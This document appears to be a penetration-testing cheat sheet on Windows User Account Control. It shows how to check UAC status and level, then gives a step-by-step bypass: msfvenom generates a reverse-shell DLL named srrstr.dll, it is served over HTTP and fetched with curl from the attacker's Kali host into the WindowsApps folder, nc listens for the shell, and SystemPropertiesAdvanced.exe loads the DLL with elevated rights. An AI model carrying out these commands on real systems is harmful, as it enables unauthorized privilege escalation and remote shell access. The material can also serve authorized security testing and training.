# Attacking the OS
```
When UAC is in place, a user can log into their system with their standard user account.
When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user.
Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.
```

## Check if UAC is Enabled
```bash
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
``` 
##  Checking UAC Leve
```bash
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# to understand the differents level :
https://focusedit.co.uk/group-policy-settings-for-uac/#:~:text=UAC%20LEVEL%203,make%20changes%20to%20my%20computer.
``` 
## Checking Windows Version
```powershell
[System.Environment]::OSVersion.Version
or
[environment]::OSVersion.Version
# refer to :
https://en.wikipedia.org/wiki/Windows_10_version_history
```
## reveals the default folders
```powershell
cmd /c echo %PATH%
```
## bypass UAC 
### Generating and Downloding Malicious srrstr.dll DLL
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI'Sip LPORT=8888 -f dll > srrstr.dll
sudo python3 -m http.server 8080
  curl http://KALI'sip:8080/srrstr.dll -O "C:\Users\UserName\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
nc -lvnp 8888
  rundll32 shell32.dll,Control_RunDLL C:\Users\UserName\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
## Executing SystemPropertiesAdvanced.exe on Target Host
```bash
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
## Check priv
```bash
whoami /priv
# you will receive all PRIVILEGES INFORMATION
```




















